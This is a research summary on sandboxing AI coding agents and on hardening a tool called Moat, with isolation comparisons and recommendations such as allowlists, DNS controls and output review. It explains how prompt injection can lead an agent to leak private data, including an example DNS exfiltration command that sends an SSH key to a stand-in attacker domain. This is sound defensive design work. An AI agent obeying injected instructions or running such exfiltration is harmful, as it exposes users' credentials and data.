# Containerization & Sandboxing for AI Agents: Research Summary

**Date:** 2026-01-13
**Status:** Research Complete

## Executive Summary

This document summarizes community discussions and technical research on sandboxing approaches for AI agents, with specific recommendations for Moat. The key tension across all sources is balancing security isolation with usability. Moat already implements several best practices but has opportunities to strengthen its security model.

---

## Sources Analyzed

1. **HN Discussion: Claude Cowork** - https://news.ycombinator.com/item?id=46593022
2. **Pierce Freeman: A Deep Dive on Agent Sandboxes** - https://pierce.dev/notes/a-deep-dive-on-agent-sandboxes
3. **Yolobox** - https://github.com/finbarr/yolobox
4. **DevSecFlops: Source Code Sandboxing** - https://kristaps.bsd.lv/devsecflops/
5. **HN Discussion: How Easy to Sandbox?** - https://news.ycombinator.com/item?id=44249511

---

## Key Findings

### 1. The "Lethal Trifecta" (Simon Willison)

A prompt injection attack is dangerous when an agent has access to all three:
1. **Private data** (files, credentials, etc.)
2. **External tools** (bash, file writes, etc.)
3. **Network exfiltration** (ability to send data out)

**Breaking any leg mitigates the risk.** Claude Cowork's approach is to lock down network access to an allowlist of domains by default.

**Critical insight from discussion:** Even with network allowlists, DNS queries can leak data (e.g., `dig your-ssh-key.evil.com`). The response to the user is itself an exfiltration channel - if the LLM can read secrets and produce output, an injection can encode data in that output.

### 2. Virtualization vs Containers vs OS Sandboxing

| Approach | Isolation Level | Overhead | Notes |
|----------|----------------|----------|-------|
| **Full VM** (Firecracker, Apple Virtualization) | Highest | High | Separate kernel, hardware-level isolation |
| **MicroVM** (Firecracker) | High | Medium | ~125ms boot, used by AWS Lambda |
| **gVisor** | High | Medium | User-space kernel, intercepts syscalls |
| **Containers** (Docker, Podman) | Medium | Low | Shared kernel, namespace isolation |
| **OS Sandboxing** (Seatbelt, Landlock, pledge) | Medium | Lowest | Process-level, no container overhead |

**Key community insight:** "Containers are not secure sandboxes by default" - they share the kernel and are not designed as security boundaries. For adversarial scenarios, VM-level isolation is required.

### 3. Sandboxing Tools Comparison (from DevSecFlops)

| System | Tool | Lines of Code | Doc Size | Notes |
|--------|------|---------------|----------|-------|
| OpenBSD | pledge | 6-14 | 10KB | Simplest, most widely used |
| macOS | Seatbelt | 15 | 60KB | Deprecated but still works |
| Linux | Landlock | 48 | 45KB | Newer, capability-based |
| Linux | seccomp | 112 | 100KB | Most complex, most granular |
| FreeBSD | Capsicum | 14 | 10KB | Capability-mode sandboxing |

**Key finding:** pledge is the most popular sandbox in open source (315 users surveyed), followed by seccomp (60). OpenBSD has highest adoption rate of sandboxing overall.

**Maintenance burden:** seccomp requires ~5x more maintenance commits than pledge/capsicum/seatbelt over time.

### 4. Claude Cowork's Approach

- Uses Apple's **Virtualization Framework** (VZVirtualMachine) on macOS
- Runs a full Linux container/VM, not just namespace isolation
- Network access locked to **allowlist of domains** by default
- Files mounted into VM with only user-selected folders accessible
- **Still has gaps:** DNS exfiltration possible, response channel remains open

### 5. Yolobox's Approach

A practical tool for running AI agents in containers with clear threat model:

**What it protects:**
- Home directory from accidental deletion
- SSH keys, credentials, dotfiles
- Other projects on machine
- Host system files

**What it does NOT protect:**
- Project directory (mounted read-write by default)
- Network access (unless `--no-network`)
- The container itself (AI has root via sudo)
- Against kernel exploits or deliberate container escapes

**Hardening levels:**
1. Basic: Standard container isolation
2. Reduced attack surface: `--no-network --readonly-project`
3. Rootless Podman: Container's root maps to unprivileged user
4. VM isolation: Run yolobox inside a VM (maximum security)

### 6. Codex CLI's Approach (from Pierce Freeman's analysis)

- Uses **Seatbelt** on macOS, **Landlock + seccomp** on Linux
- Sandboxing is **opt-out, not opt-in** - every command goes through sandbox by default
- Generates dynamic Seatbelt profiles with writable roots
- Carves out `.git` directories as read-only to prevent corruption
- Uses command whitelisting (`assess_command_safety`) before execution

**Limitations of OS sandboxing:**
- Can't express "only allow HTTPS to api.openai.com" - it's all-or-nothing for network
- Package management (pip, npm) needs external access - sandbox can't run homebrew
- Policy complexity leads to security holes (e.g., failed to block ~/Library access)

---

## Moat Current State

### What Moat Already Does Well

1. **Multi-runtime support:** Docker, Apple Container, and sandbox-exec/bubblewrap backends
2. **Credential broker architecture:** Credentials never enter the container; proxy injects auth headers
3. **Network proxy with TLS interception:** All HTTP/HTTPS traffic flows through auth proxy
4. **Proxy authentication:** Token-based auth prevents unauthorized proxy access
5. **File system isolation:** Read-only root with writable mounts for specific directories
6. **Request logging:** All proxied requests logged for observability

### Gaps Identified

1. **Network is allow-all by default** - should be allowlist-based
2. **No DNS-level protection** - DNS queries can exfiltrate data
3. **No Landlock integration** for Linux (relies on bubblewrap namespaces only)
4. **No filesystem snapshots** for rollback after destructive operations
5. **No output review mode** to catch exfiltration via response channel

---

## Recommendations for Moat

### High Priority

#### 1. Default-Deny Network with Sensible Allowlist

```yaml
# Proposed default in agent.yaml
network:
  mode: allowlist  # default, can be set to "allow-all"
  allow:
    - "*.github.com"
    - "*.githubusercontent.com"
    - "api.anthropic.com"
    - "*.npmjs.org"
    - "pypi.org"
    - "*.pypi.org"
```

**Rationale:** This breaks the "exfiltration" leg of the lethal trifecta by default while allowing common package managers and APIs.

#### 2. DNS Exfiltration Protection

Options:
- **DNS proxy with allowlist:** Intercept DNS and only resolve allowed domains
- **DNS-over-HTTPS through proxy:** Route all DNS through the HTTP proxy
- **Block DNS entirely:** Only allow connections to IPs explicitly in allowlist

**Rationale:** DNS is a well-known exfiltration channel that bypasses HTTP proxies.

#### 3. Add Landlock Integration for Linux

Current bubblewrap provides namespace isolation but not syscall-level restrictions. Adding Landlock would provide:
- Capability-based filesystem access control
- Works alongside namespaces as defense-in-depth
- Kernel-enforced (can't be bypassed from userspace)

```go
// Proposed addition to sandbox.go
func (r *SandboxRuntime) buildLinuxCommandWithLandlock(ctx context.Context, cfg Config) (*exec.Cmd, error) {
    // Apply Landlock rules before exec
    // Restrict filesystem to only writable paths
}
```

### Medium Priority

#### 4. Filesystem Snapshots Before Runs

```bash
# For ZFS
sudo zfs snapshot pool/workspace@before-run-abc123

# For APFS (macOS)
tmutil localsnapshot /path/to/workspace
```

**Rationale:** Multiple HN commenters noted that `rm -rf` on `.git` is unrecoverable without snapshots. Git history is not a backup.

#### 5. Add Firecracker/gVisor Backend Option

For users requiring stronger isolation than containers:

```go
const (
    RuntimeDocker     RuntimeType = "docker"
    RuntimeApple      RuntimeType = "apple"
    RuntimeSandbox    RuntimeType = "sandbox"
    RuntimeFirecracker RuntimeType = "firecracker"  // NEW
    RuntimeGVisor     RuntimeType = "gvisor"        // NEW
)
```

**Rationale:** Security-conscious users or enterprise deployments may require VM-level isolation.

#### 6. Hardening Levels (inspired by yolobox)

```yaml
# In agent.yaml
security:
  level: standard  # standard | hardened | paranoid

# level: standard
#   - Container isolation
#   - Network allowlist
#   - Credential broker

# level: hardened
#   - Above + Landlock/seccomp
#   - Read-only project (outputs to /output)
#   - No network (offline mode)

# level: paranoid
#   - MicroVM isolation (Firecracker)
#   - Snapshot before run
#   - Output review before delivery
```

### Lower Priority / Future

#### 7. Output Review Mode

Allow human review of agent outputs before they leave the sandbox:

```bash
agent run claude-code . --review-outputs
# Agent completes task
# User sees proposed outputs/responses
# User approves or rejects before delivery
```

**Rationale:** The response to the user is itself an exfiltration channel. This breaks that leg of the trifecta for sensitive workloads.

#### 8. macOS 26+ Native Containerization

Apple's new container framework in macOS 26 (Tahoe) may provide better integration than sandbox-exec. Monitor for when it becomes the recommended approach.

---

## Implementation Priority Matrix

| Recommendation | Effort | Impact | Priority |
|----------------|--------|--------|----------|
| Default-deny network | Low | High | P0 |
| DNS protection | Medium | High | P0 |
| Landlock integration | Medium | Medium | P1 |
| Filesystem snapshots | Low | Medium | P1 |
| Hardening levels | Medium | Medium | P2 |
| Firecracker backend | High | Medium | P2 |
| Output review mode | Medium | Low | P3 |

---

## Conclusion

Moat is architecturally well-positioned with its credential broker pattern and proxy-based approach. The main gaps are:

1. **Network should be deny-by-default** (currently allow-all)
2. **DNS exfiltration is unaddressed**
3. **Linux sandboxing could be stronger** with Landlock

The community consensus is clear: containers alone are not sufficient for adversarial scenarios. Moat should offer graduated security levels, with the default being "secure enough for accidental damage" and optional hardening for sensitive workloads.

---

## References

- [HN: Claude Cowork Discussion](https://news.ycombinator.com/item?id=46593022)
- [Pierce Freeman: Agent Sandboxes Deep Dive](https://pierce.dev/notes/a-deep-dive-on-agent-sandboxes)
- [Yolobox GitHub](https://github.com/finbarr/yolobox)
- [DevSecFlops: Source Code Sandboxing](https://kristaps.bsd.lv/devsecflops/)
- [HN: How Easy to Sandbox?](https://news.ycombinator.com/item?id=44249511)
- [Simon Willison: Claude Cowork First Impressions](https://simonwillison.net/2026/Jan/12/claude-cowork/)
- [Apple Container GitHub](https://github.com/apple/container)
- [Landlock Documentation](https://landlock.io/)
- [Firecracker MicroVMs](https://firecracker-microvm.github.io/)
